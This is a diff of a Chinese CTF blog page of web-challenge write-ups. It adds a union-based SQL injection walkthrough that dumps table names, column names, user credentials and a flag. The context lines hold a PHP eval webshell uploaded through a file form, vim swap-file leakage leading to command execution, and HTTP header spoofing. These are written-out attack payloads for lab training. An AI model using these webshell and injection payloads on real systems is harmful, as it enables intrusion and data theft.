@@ -48,8 +48,15 @@
 <meta property="og:image" content="http://example.com/images/S6.png">
 <meta property="og:image" content="http://example.com/images/shit.png">
 <meta property="og:image" content="http://example.com/images/dumu.png">
+<meta property="og:image" content="http://example.com/images/Y.png">
+<meta property="og:image" content="http://example.com/images/DO.png">
+<meta property="og:image" content="http://example.com/images/RV9CJ.png">
+<meta property="og:image" content="http://example.com/images/P2KH.png">
+<meta property="og:image" content="http://example.com/images/2QN.png">
+<meta property="og:image" content="http://example.com/images/QE1.png">
+<meta property="og:image" content="http://example.com/images/CFC44N6.png">
 <meta property="article:published_time" content="2023-05-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-20T14:00:03.115Z">
+<meta property="article:modified_time" content="2023-05-21T13:49:56.002Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/A9.png">
@@ -262,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.9k 字
+          2.4k 字
         
       </span>
     
@@ -273,7 +280,7 @@
         
         
         
-          16 分钟
+          21 分钟
         
       </span>
     
@@ -336,6 +343,20 @@
 <h2 id="作业管理系统"><a href="#作业管理系统" class="headerlink" title="作业管理系统"></a>作业管理系统</h2><p>先进入源码查看，给了账户和密码<br>进入发现可以进行文件上传<br>那么我们上传一个带有木马的php文件试试<br>php文件内容为<?php eval($_POST['a']);?><br>上传成功后再url中输入你的php文件名以进入<br>打开中国蚁剑，复制刚才的url地址<br><img src="/images/N69.png" srcset="/img/loading.gif" lazyload><br>成功进入<br>接下来在文件中找flag就行了<br>还有一种方法是：<br>进入到你提交的文件后打开hackbar，用post提交分别输入<br>a&#x3D;system(“ls”);<br>a&#x3D;system(“ls &#x2F;“);<br>a&#x3D;system(“cat &#x2F;flag”);</p>
 <h2 id="vim-yyds"><a href="#vim-yyds" class="headerlink" title="vim yyds"></a>vim yyds</h2><p>vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php.swp文件，所以我们可以访问.index.php.swp，下载下来<br>当我们下载下来会发现都是一些乱码<br><img src="/images/SW.png" srcset="/img/loading.gif" lazyload><br>往下翻发现了我们需要的内容，但这些内容却不知道它们的次序与是否为完整内容<br>我们先提取关键字password与cmd都为post，password&#x3D;Give_Me_Your_Flag，但还有一个if ($_POST[‘password’] &#x3D;&#x3D;&#x3D; base64_encode($password)),把password内容编码为base64形式即可，接着我们再看eval(system($_POST[‘cmd’]));system在外面，意味着我们可以直接在cmd写命令，先让cmd&#x3D;ls试试<br><img src="/images/HC.png" srcset="/img/loading.gif" lazyload><br>可以看到，页面成功显示了命令执行的结果,接下来就到了熟悉的操作了，首先看看根目录，cmd&#x3D;ls &#x2F;<br><img src="/images/H3S1.png" srcset="/img/loading.gif" lazyload><br>发现flag，接下来cmd&#x3D;cat &#x2F;flag<br>即可得出flag的值</p>
 <h2 id="http-pro-max-plus"><a href="#http-pro-max-plus" class="headerlink" title="http pro max plus"></a>http pro max plus</h2><p>进入页面，只显示了一个**只允许本地访问，查看源码发现什么都没有，那么我们burpsuite抓包试试<br>只允许在本地使用的话我们先来个x-forwarded-for:127.0.0.1<br><img src="/images/POR.png" srcset="/img/loading.gif" lazyload><br>显示不行，那么我们换一种方式<br>client-ip: 127.0.0.1<br><img src="/images/G7.png" srcset="/img/loading.gif" lazyload><br>提示我们需要from pornhub.com<br>那我们再添加一个referer: pornhub.com<br><img src="/images/9D.png" srcset="/img/loading.gif" lazyload><br>接着页面再提示我们需要用chrome浏览器<br>所以我们把UA头改为Chrome<br><img src="/images/S6.png" srcset="/img/loading.gif" lazyload><br>这时有提示了需要开代理才行<br>那么我们再添加一个via:Clash.win<br><img src="/images/shit.png" srcset="/img/loading.gif" lazyload><br>获得了一个.php文件<br>访问它<br>进入了发现除了step2外并没有什么特别的东西<br>打开源码看看<br><img src="/images/dumu.png" srcset="/img/loading.gif" lazyload><br>emmm,又是一个线索<br>打开它，直接获得flag</p>
+<h2 id="这是什么？sql！注一下"><a href="#这是什么？sql！注一下" class="headerlink" title="这是什么？sql！注一下"></a>这是什么？sql！注一下</h2><p><img src="/images/Y.png" srcset="/img/loading.gif" lazyload><br>直接分析上图中的语句得知要闭合语句则要加6个括号<br>那么我们开始命令执行</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure>
+<p><img src="/images/DO.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>#<br></code></pre></td></tr></table></figure>
+<p><img src="/images/RV9CJ.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>))))))<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
+<p><img src="/images/P2KH.png" srcset="/img/loading.gif" lazyload></p>
+<p>这是一个假的flag，不能用这个方法解题<br>用另一语句查找</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata #<br></code></pre></td></tr></table></figure>
+<p><img src="/images/2QN.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>)))))) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;ctftraining&#x27;</span>#<br></code></pre></td></tr></table></figure>
+<p><img src="/images/QE1.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>)))))) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,flag <span class="hljs-keyword">from</span> ctftraining.flag<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/CFC44N6.png" srcset="/img/loading.gif" lazyload><br>获得flag</p>
 
                 
               </div>
@@ -398,12 +419,18 @@
                   <article class="post-prev col-6">
                     
                     
+                      <a href="/2023/05/23/ctfweb/" title="ctf_web">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">ctf_web</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/05/14/wenjianshangchuan/" title="web入门:文件上传">
-                        <span class="hidden-mobile">web入门:文件上传</span>
+                      <a href="/2023/05/10/phptexin/" title="php特性">
+                        <span class="hidden-mobile">php特性</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
